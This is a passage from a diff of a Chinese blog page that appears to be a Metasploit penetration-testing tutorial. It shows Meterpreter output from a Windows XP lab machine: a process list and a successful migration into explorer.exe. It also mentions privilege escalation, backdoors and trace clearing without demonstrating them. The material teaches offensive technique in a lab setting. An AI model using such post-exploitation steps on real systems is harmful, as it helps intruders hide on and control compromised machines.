class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System             x86   0        NT AUTHORITY\SYSTEM           </span><br><span class="line"> 188   664   VGAuthService.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe</span><br><span class="line">192   1484  conime.exe         x86   0        WINXP-Z9M8R8-1\z9m8r8         C:\WINDOWS\system32\conime.exe</span><br><span class="line">808   1508  pythonw.exe        x86   0        WINXP-Z9M8R8-1\z9m8r8         C:\Python27\pythonw.exe</span><br><span class="line">1508  1484  explorer.exe       x86   0        WINXP-Z9M8R8-1\z9m8r8         C:\WINDOWS\Explorer.EXE</span><br><span class="line">…………</span><br><span class="line">      meterpreter&gt; migrate  1508</span><br><span class="line">[*] Migrating from 1024 to 1508...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">    meterpreter&gt; </span><br></pre></td></tr></table></figure>
 <h3 id="后渗透攻击">4、后渗透攻击</h3>
 <p><strong>提权，部署后门，清理痕迹等，此处不再演示，可参考该系列其他笔记</strong></p>
-<h2 id="四参考文献">四、参考文献</h2>
-<p><strong>《精通Metasploit渗透测试》</strong></p>
 
     </div>
 
@@ -539,7 +373,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:13</span>
+    <span title="站点阅读时长">10:14</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
